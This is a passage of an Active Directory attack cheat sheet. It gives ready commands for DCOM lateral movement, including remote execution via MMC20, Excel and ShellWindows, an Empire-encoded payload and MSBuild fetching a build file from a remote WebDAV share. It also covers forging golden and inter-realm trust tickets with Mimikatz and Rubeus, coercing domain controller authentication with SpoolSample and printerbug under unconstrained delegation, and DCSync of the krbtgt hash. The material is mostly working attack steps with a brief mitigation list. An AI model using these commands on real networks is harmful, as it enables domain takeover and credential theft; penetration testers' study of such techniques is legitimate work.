<li>CheeseTools - <a href="https://github.com/klezVirus/CheeseTools">https://github.com/klezVirus/CheeseTools</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/</span>
</span></span><span style="display:flex;"><span>-t, --target=VALUE         Target Machine
</span></span><span style="display:flex;"><span>-b, --binary=VALUE         Binary<span style="color:#960050;background-color:#1e0010">:</span> powershell.exe
</span></span><span style="display:flex;"><span>-a, --args=VALUE           Arguments<span style="color:#960050;background-color:#1e0010">:</span> -enc &lt;blah&gt;
</span></span><span style="display:flex;"><span>-m, --method=VALUE         Methods<span style="color:#960050;background-color:#1e0010">:</span> MMC20Application, ShellWindows,
</span></span><span style="display:flex;"><span>                            ShellBrowserWindow, ExcelDDE, VisioAddonEx,
</span></span><span style="display:flex;"><span>                            OutlookShellEx, ExcelXLL, VisioExecLine, 
</span></span><span style="display:flex;"><span>                            OfficeMacro
</span></span><span style="display:flex;"><span>-r, --reg, --registry      Enable registry manipulation
</span></span><span style="display:flex;"><span>-h, -?, --help             Show Help
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Current Methods<span style="color:#960050;background-color:#1e0010">:</span> MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro.
</span></span></code></pre></div></li>
<li>Invoke-DCOM - <a href="https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1">https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module .\Invoke-DCOM.ps1
</span></span><span style="display:flex;"><span>Invoke-DCOM -ComputerName <span style="color:#e6db74">&#39;10.10.10.10&#39;</span> -Method MMC20.Application -Command <span style="color:#e6db74">&#34;calc.exe&#34;</span>
</span></span><span style="display:flex;"><span>Invoke-DCOM -ComputerName <span style="color:#e6db74">&#39;10.10.10.10&#39;</span> -Method ExcelDDE -Command <span style="color:#e6db74">&#34;calc.exe&#34;</span>
</span></span><span style="display:flex;"><span>Invoke-DCOM -ComputerName <span style="color:#e6db74">&#39;10.10.10.10&#39;</span> -Method ServiceStart <span style="color:#e6db74">&#34;MyService&#34;</span>
</span></span><span style="display:flex;"><span>Invoke-DCOM -ComputerName <span style="color:#e6db74">&#39;10.10.10.10&#39;</span> -Method ShellBrowserWindow -Command <span style="color:#e6db74">&#34;calc.exe&#34;</span>
</span></span><span style="display:flex;"><span>Invoke-DCOM -ComputerName <span style="color:#e6db74">&#39;10.10.10.10&#39;</span> -Method ShellWindows -Command <span style="color:#e6db74">&#34;calc.exe&#34;</span>
</span></span></code></pre></div></li>
</ul>
<h4 id="dcom-via-mmc-application-class">
  DCOM via MMC Application Class
  <a class="anchor" href="#dcom-via-mmc-application-class">#</a>
</h4>
<p>This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named <strong>&ldquo;ExecuteShellCommand&rdquo;</strong> under <strong>Document.ActiveView</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>PS C:\&gt; $com = [<span style="color:#66d9ef">activator</span>]::CreateInstance([<span style="color:#66d9ef">type</span>]::GetTypeFromProgID(<span style="color:#e6db74">&#34;MMC20.Application&#34;</span>,<span style="color:#e6db74">&#34;10.10.10.1&#34;</span>))
</span></span><span style="display:flex;"><span>PS C:\&gt; $com.Document.ActiveView.ExecuteShellCommand(<span style="color:#e6db74">&#34;C:\Windows\System32\calc.exe&#34;</span>,$null,$null,<span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>PS C:\&gt; $com.Document.ActiveView.ExecuteShellCommand(<span style="color:#e6db74">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>,$null,<span style="color:#e6db74">&#34;-enc DFDFSFSFSFSFSFSFSDFSFSF &lt; Empire encoded string &gt; &#34;</span>,<span style="color:#e6db74">&#34;7&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Weaponized example with MSBuild</span>
</span></span><span style="display:flex;"><span>PS C:\&gt; [<span style="color:#66d9ef">System.Activator</span>]::CreateInstance([<span style="color:#66d9ef">type</span>]::GetTypeFromProgID(<span style="color:#e6db74">&#34;MMC20.Application&#34;</span>,<span style="color:#e6db74">&#34;10.10.10.1&#34;</span>)).Document.ActiveView.ExecuteShellCommand(<span style="color:#e6db74">&#34;c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&#34;</span>,$null,<span style="color:#e6db74">&#34;\\10.10.10.2\webdav\build.xml&#34;</span>,<span style="color:#e6db74">&#34;7&#34;</span>)
</span></span></code></pre></div><p>Invoke-MMC20RCE : <a href="https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1">https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1</a></p>
<h4 id="dcom-via-office">
  DCOM via Office
  <a class="anchor" href="#dcom-via-office">#</a>
</h4>
<ul>
<li>Excel.Application
<ul>
<li>DDEInitiate</li>
<li>RegisterXLL</li>
</ul>
</li>
<li>Outlook.Application
<ul>
<li>CreateObject-&gt;Shell.Application-&gt;ShellExecute</li>
<li>CreateObject-&gt;ScriptControl (office-32bit only)</li>
</ul>
</li>
<li>Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)
<ul>
<li>Addons</li>
<li>ExecuteLine</li>
</ul>
</li>
<li>Word.Application
<ul>
<li>RunAutoMacro</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM</span>
</span></span><span style="display:flex;"><span>Invoke-Excel4DCOM64.ps1 https<span style="color:#960050;background-color:#1e0010">:</span>//gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9
</span></span><span style="display:flex;"><span>Invoke-ExShellcode.ps1 https<span style="color:#960050;background-color:#1e0010">:</span>//gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using Excel DDE</span>
</span></span><span style="display:flex;"><span>PS C:\&gt; $excel = [<span style="color:#66d9ef">activator</span>]::CreateInstance([<span style="color:#66d9ef">type</span>]::GetTypeFromProgID(<span style="color:#e6db74">&#34;Excel.Application&#34;</span>, <span style="color:#e6db74">&#34;</span>$ComputerName<span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>PS C:\&gt; $excel.DisplayAlerts = $false
</span></span><span style="display:flex;"><span>PS C:\&gt; $excel.DDEInitiate(<span style="color:#e6db74">&#34;cmd&#34;</span>, <span style="color:#e6db74">&#34;/c calc.exe&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using Excel RegisterXLL</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Can&#39;t be used reliably with a remote target</span>
</span></span><span style="display:flex;"><span>Require<span style="color:#960050;background-color:#1e0010">:</span> reg add HKEY_CURRENT_USER\Software\Microsoft\Office\<span style="color:#ae81ff">16.0</span>\Excel\Security\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>PS&gt; $excel = [<span style="color:#66d9ef">activator</span>]::CreateInstance([<span style="color:#66d9ef">type</span>]::GetTypeFromProgID(<span style="color:#e6db74">&#34;Excel.Application&#34;</span>, <span style="color:#e6db74">&#34;</span>$ComputerName<span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>PS&gt; $excel.RegisterXLL(<span style="color:#e6db74">&#34;EvilXLL.dll&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using Visio</span>
</span></span><span style="display:flex;"><span>$visio = [<span style="color:#66d9ef">activator</span>]::CreateInstance([<span style="color:#66d9ef">type</span>]::GetTypeFromProgID(<span style="color:#e6db74">&#34;Visio.InvisibleApp&#34;</span>, <span style="color:#e6db74">&#34;</span>$ComputerName<span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>$visio.Addons.Add(<span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span>).Run(<span style="color:#e6db74">&#34;/c calc&#34;</span>)
</span></span></code></pre></div><h4 id="dcom-via-shellexecute">
  DCOM via ShellExecute
  <a class="anchor" href="#dcom-via-shellexecute">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$com = [<span style="color:#66d9ef">Type</span>]::GetTypeFromCLSID(<span style="color:#e6db74">&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;</span>,<span style="color:#e6db74">&#34;10.10.10.1&#34;</span>)
</span></span><span style="display:flex;"><span>$obj = [<span style="color:#66d9ef">System.Activator</span>]::CreateInstance($com)
</span></span><span style="display:flex;"><span>$item = $obj.Item()
</span></span><span style="display:flex;"><span>$item.Document.Application.ShellExecute(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>,<span style="color:#e6db74">&#34;/c calc.exe&#34;</span>,<span style="color:#e6db74">&#34;C:\windows\system32&#34;</span>,$null,<span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><h4 id="dcom-via-shellbrowserwindow">
  DCOM via ShellBrowserWindow
  <a class="anchor" href="#dcom-via-shellbrowserwindow">#</a>
</h4>
<p>:warning: Windows 10 only, the object doesn&rsquo;t exists in Windows 7</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$com = [<span style="color:#66d9ef">Type</span>]::GetTypeFromCLSID(<span style="color:#e6db74">&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;</span>,<span style="color:#e6db74">&#34;10.10.10.1&#34;</span>)
</span></span><span style="display:flex;"><span>$obj = [<span style="color:#66d9ef">System.Activator</span>]::CreateInstance($com)
</span></span><span style="display:flex;"><span>$obj.Application.ShellExecute(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>,<span style="color:#e6db74">&#34;/c calc.exe&#34;</span>,<span style="color:#e6db74">&#34;C:\windows\system32&#34;</span>,$null,<span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><h3 id="trust-relationship-between-domains">
  Trust relationship between domains
  <a class="anchor" href="#trust-relationship-between-domains">#</a>
</h3>
<ul>
<li>One-way
<ul>
<li>Domain B trusts A</li>
<li>Users in Domain A can access resources in Domain B</li>
<li>Users in Domain B cannot access resources in Domain A</li>
</ul>
</li>
<li>Two-way
<ul>
<li>Domain A trusts Domain B</li>
<li>Domain B trusts Domain A</li>
<li>Authentication requests can be passed between the two domains in both directions</li>
</ul>
</li>
</ul>
<h4 id="enumerate-trusts-between-domains">
  Enumerate trusts between domains
  <a class="anchor" href="#enumerate-trusts-between-domains">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>nltest /trusted_domains
</span></span></code></pre></div><p>or</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>([<span style="color:#66d9ef">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()).GetAllTrustRelationships()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SourceName          TargetName                    TrustType      TrustDirection
</span></span><span style="display:flex;"><span>----------          ----------                    ---------      --------------
</span></span><span style="display:flex;"><span>domainA.local      domainB.local                  TreeRoot       Bidirectional
</span></span></code></pre></div><h4 id="exploit-trusts-between-domains">
  Exploit trusts between domains
  <a class="anchor" href="#exploit-trusts-between-domains">#</a>
</h4>
<p>:warning: Require a Domain-Admin level access to the current domain.</p>
<table>
<thead>
<tr>
<th>Source</th>
<th>Target</th>
<th>Technique to use</th>
<th>Trust relationship</th>
</tr>
</thead>
<tbody>
<tr>
<td>Root</td>
<td>Child</td>
<td>Golden Ticket + Enterprise Admin group (Mimikatz /groups)</td>
<td>Inter Realm (2-way)</td>
</tr>
<tr>
<td>Child</td>
<td>Child</td>
<td>SID History exploitation (Mimikatz /sids)</td>
<td>Inter Realm Parent-Child (2-way)</td>
</tr>
<tr>
<td>Child</td>
<td>Root</td>
<td>SID History exploitation (Mimikatz /sids)</td>
<td>Inter Realm Tree-Root (2-way)</td>
</tr>
<tr>
<td>Forest A</td>
<td>Forest B</td>
<td>PrinterBug + Unconstrained delegation ?</td>
<td>Inter Realm Forest or External (2-way)</td>
</tr>
</tbody>
</table>
<h3 id="child-domain-to-forest-compromise---sid-hijacking">
  Child Domain to Forest Compromise - SID Hijacking
  <a class="anchor" href="#child-domain-to-forest-compromise---sid-hijacking">#</a>
</h3>
<p>Most trees are linked with dual sided trust relationships to allow for sharing of resources.
By default the first domain created if the Forest Root.</p>
<p><strong>Requirements</strong>:</p>
<ul>
<li>KRBTGT Hash</li>
<li>Find the SID of the domain
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ Convert-NameToSid target.domain.com\krbtgt
</span></span><span style="display:flex;"><span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2941561648</span>-<span style="color:#ae81ff">383941485</span>-<span style="color:#ae81ff">1389968811</span>-<span style="color:#ae81ff">502</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># with Impacket</span>
</span></span><span style="display:flex;"><span>lookupsid.py domain/user<span style="color:#960050;background-color:#1e0010">:</span>password@10.10.10.10
</span></span></code></pre></div></li>
<li>Replace 502 with 519 to represent Enterprise Admins</li>
<li>Create golden ticket and attack parent domain.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>kerberos::golden /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /krbtgt<span style="color:#960050;background-color:#1e0010">:</span>HASH_KRBTGT /domain<span style="color:#960050;background-color:#1e0010">:</span>domain.local /sid<span style="color:#960050;background-color:#1e0010">:</span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2941561648</span>-<span style="color:#ae81ff">383941485</span>-<span style="color:#ae81ff">1389968811</span> /sids<span style="color:#960050;background-color:#1e0010">:</span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-SID-SECOND-DOMAIN-<span style="color:#ae81ff">519</span> /ptt
</span></span></code></pre></div></li>
</ul>
<h3 id="forest-to-forest-compromise---trust-ticket">
  Forest to Forest Compromise - Trust Ticket
  <a class="anchor" href="#forest-to-forest-compromise---trust-ticket">#</a>
</h3>
<ul>
<li>Require: SID filtering disabled</li>
</ul>
<p>From the DC, dump the hash of the <code>currentdomain\targetdomain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using
Mimikatz, adding the SID for the target domain&rsquo;s enterprise admins group to our <strong>SID history</strong>.</p>
<h4 id="dumping-trust-passwords-trust-keys">
  Dumping trust passwords (trust keys)
  <a class="anchor" href="#dumping-trust-passwords-trust-keys">#</a>
</h4>
<blockquote>
<p>Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing <strong>$</strong> are computer accounts, but some are trust accounts.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>lsadump::trust /patch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>or find the TRUST_NAME$ machine account hash
</span></span></code></pre></div><h4 id="create-a-forged-trust-ticket-inter-realm-tgt-using-mimikatz">
  Create a forged trust ticket (inter-realm TGT) using Mimikatz
  <a class="anchor" href="#create-a-forged-trust-ticket-inter-realm-tgt-using-mimikatz">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz(commandline) <span style="color:#75715e"># kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi</span>
</span></span><span style="display:flex;"><span>mimikatz(commandline) <span style="color:#75715e"># kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi</span>
</span></span></code></pre></div><h4 id="use-the-trust-ticket-file-to-get-a-st-for-the-targeted-service">
  Use the Trust Ticket file to get a ST for the targeted service
  <a class="anchor" href="#use-the-trust-ticket-file-to-get-a-st-for-the-targeted-service">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
</span></span><span style="display:flex;"><span>.\Rubeus.exe asktgs /ticket<span style="color:#960050;background-color:#1e0010">:</span>c:\ad\tools\mcorp-ticket.kirbi /service<span style="color:#960050;background-color:#1e0010">:</span>LDAP/mcorp-dc.moneycorp.local /dc<span style="color:#960050;background-color:#1e0010">:</span>mcorp-dc.moneycorp.local /ptt
</span></span></code></pre></div><p>Inject the ST file and access the targeted service with the spoofed rights.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>kirbikator lsa .\ticket.kirbi
</span></span><span style="display:flex;"><span>ls \\machine.domain.local\c$
</span></span></code></pre></div><h3 id="privileged-access-management-pam-trust">
  Privileged Access Management (PAM) Trust
  <a class="anchor" href="#privileged-access-management-pam-trust">#</a>
</h3>
<p>Require: Windows Server 2016 or earlier<br>
If we compromise the bastion we get <code>Domain Admins</code> privileges on the other domain</p>
<ul>
<li>Default configuration for PAM Trust
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># execute on our forest</span>
</span></span><span style="display:flex;"><span>netdom trust lab.local /domain<span style="color:#960050;background-color:#1e0010">:</span>bastion.local /ForestTransitive<span style="color:#960050;background-color:#1e0010">:</span>Yes 
</span></span><span style="display:flex;"><span>netdom trust lab.local /domain<span style="color:#960050;background-color:#1e0010">:</span>bastion.local /EnableSIDHistory<span style="color:#960050;background-color:#1e0010">:</span>Yes 
</span></span><span style="display:flex;"><span>netdom trust lab.local /domain<span style="color:#960050;background-color:#1e0010">:</span>bastion.local /EnablePIMTrust<span style="color:#960050;background-color:#1e0010">:</span>Yes 
</span></span><span style="display:flex;"><span>netdom trust lab.local /domain<span style="color:#960050;background-color:#1e0010">:</span>bastion.local /Quarantine<span style="color:#960050;background-color:#1e0010">:</span>No
</span></span><span style="display:flex;"><span><span style="color:#75715e"># execute on our bastion</span>
</span></span><span style="display:flex;"><span>netdom trust bastion.local /domain<span style="color:#960050;background-color:#1e0010">:</span>lab.local /ForestTransitive<span style="color:#960050;background-color:#1e0010">:</span>Yes
</span></span></code></pre></div></li>
<li>Enumerate
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Using ADModule</span>
</span></span><span style="display:flex;"><span>Get-ADTrust -Filter {(ForestTransitive <span style="color:#f92672">-eq</span> $True) <span style="color:#f92672">-and</span> (SIDFilteringQuarantined <span style="color:#f92672">-eq</span> $False)}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerate shadow security principals </span>
</span></span><span style="display:flex;"><span>Get-ADObject -SearchBase (<span style="color:#e6db74">&#34;CN=Shadow Principal Configuration,CN=Services,&#34;</span> + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
</span></span></code></pre></div></li>
<li>Compromise
<ul>
<li>Using SID History</li>
<li>Using the previously found Shadow Security Principal</li>
</ul>
</li>
</ul>
<h3 id="kerberos-unconstrained-delegation">
  Kerberos Unconstrained Delegation
  <a class="anchor" href="#kerberos-unconstrained-delegation">#</a>
</h3>
<blockquote>
<p>The user sends a ST to access the service, along with their TGT, and then the service can use the user&rsquo;s TGT to request a ST for the user to any other service and impersonate the user. - <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
</blockquote>
<blockquote>
<p>When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user&rsquo;s TGT ticket gets saved to that computer&rsquo;s memory.</p>
</blockquote>
<p>:warning: Unconstrained delegation used to be the only option available in Windows 2000</p>
<h4 id="spoolservice-abuse-with-unconstrained-delegation">
  SpoolService Abuse with Unconstrained Delegation
  <a class="anchor" href="#spoolservice-abuse-with-unconstrained-delegation">#</a>
</h4>
<p>The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.</p>
<p><strong>Requirements</strong>:</p>
<ul>
<li>Object with Property <strong>Trust this computer for delegation to any service (Kerberos only)</strong></li>
<li>Must have <strong>ADS_UF_TRUSTED_FOR_DELEGATION</strong></li>
<li>Must not have <strong>ADS_UF_NOT_DELEGATED</strong> flag</li>
<li>User must not be in the <strong>Protected Users</strong> group</li>
<li>User must not have the flag <strong>Account is sensitive and cannot be delegated</strong></li>
</ul>
<h5 id="find-delegation">
  Find delegation
  <a class="anchor" href="#find-delegation">#</a>
</h5>
<p>:warning: : Domain controllers usually have unconstrained delegation enabled. <br>
Check the <code>TrustedForDelegation</code> property.</p>
<ul>
<li>
<p><a href="https://github.com/samratashok/ADModule">ADModule</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># From https://github.com/samratashok/ADModule</span>
</span></span><span style="display:flex;"><span>PS&gt; Get-ADComputer -Filter {TrustedForDelegation <span style="color:#f92672">-eq</span> $True}
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$&gt; ldapdomaindump -u <span style="color:#e6db74">&#34;DOMAIN\\Account&#34;</span> -p <span style="color:#e6db74">&#34;Password123*&#34;</span> <span style="color:#ae81ff">10.10</span>.10.10   
</span></span><span style="display:flex;"><span>grep TRUSTED_FOR_DELEGATION domain_computers.grep
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki">CrackMapExec module</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cme ldap <span style="color:#ae81ff">10.10</span>.10.10 -u username -p password --trusted-for-delegation
</span></span></code></pre></div></li>
</ul>
<h5 id="spoolservice-status">
  SpoolService status
  <a class="anchor" href="#spoolservice-status">#</a>
</h5>
<p>Check if the spool service is running on the remote host</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ls \\dc01\pipe\spoolss
</span></span><span style="display:flex;"><span>python rpcdump.py DOMAIN/user<span style="color:#960050;background-color:#1e0010">:</span>password@10.10.10.10
</span></span></code></pre></div><h5 id="monitor-with-rubeus">
  Monitor with Rubeus
  <a class="anchor" href="#monitor-with-rubeus">#</a>
</h5>
<p>Monitor incoming connections from Rubeus.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe monitor /interval<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1</span> 
</span></span></code></pre></div><h5 id="force-a-connect-back-from-the-dc">
  Force a connect back from the DC
  <a class="anchor" href="#force-a-connect-back-from-the-dc">#</a>
</h5>
<p>Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.</p>
<blockquote>
<p>SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a &ldquo;feature&rdquo; in the MS-RPRN RPC interface.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># From https://github.com/leechristensen/SpoolSample</span>
</span></span><span style="display:flex;"><span>.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
</span></span><span style="display:flex;"><span>.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
</span></span><span style="display:flex;"><span><span style="color:#75715e"># DC01.HACKER.LAB is the domain controller we want to compromise</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># From https://github.com/dirkjanm/krbrelayx</span>
</span></span><span style="display:flex;"><span>printerbug.py <span style="color:#e6db74">&#39;domain/username:password&#39;</span>@&lt;VICTIM-DC-NAME&gt; &lt;UNCONSTRAINED-SERVER-DC-NAME&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689</span>
</span></span><span style="display:flex;"><span>python dementor.py -d domain -u username -p password &lt;UNCONSTRAINED-SERVER-DC-NAME&gt; &lt;VICTIM-DC-NAME&gt;
</span></span></code></pre></div><p>If the attack worked you should get a TGT of the domain controller.</p>
<h5 id="load-the-ticket">
  Load the ticket
  <a class="anchor" href="#load-the-ticket">#</a>
</h5>
<p>Extract the base64 TGT from Rubeus output and load it to our current session.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\Rubeus.exe asktgs /ticket<span style="color:#960050;background-color:#1e0010">:</span>&lt;ticket base64&gt; /ptt
</span></span></code></pre></div><p>Alternatively you could also grab the ticket using Mimikatz :  <code>mimikatz # sekurlsa::tickets</code></p>
<p>Then you can use DCsync or another attack : <code>mimikatz # lsadump::dcsync /user:HACKER\krbtgt</code></p>
<h5 id="mitigation">
  Mitigation
  <a class="anchor" href="#mitigation">#</a>
</h5>
<ul>
<li>Ensure sensitive accounts cannot be delegated</li>
<li>Disable the Print Spooler Service</li>
</ul>
<h4 id="ms-efsrpc-abuse-with-unconstrained-delegation">
  MS-EFSRPC Abuse with Unconstrained Delegation
  <a class="anchor" href="#ms-efsrpc-abuse-with-unconstrained-delegation">#</a>
</h4>
<p>Using <code>PetitPotam</code>, another tool to coerce a callback from the targeted machine, instead of <code>SpoolSample</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Coerce the callback</span>
</span></span><span style="display:flex;"><span>git clone https://github.com/topotam/PetitPotam
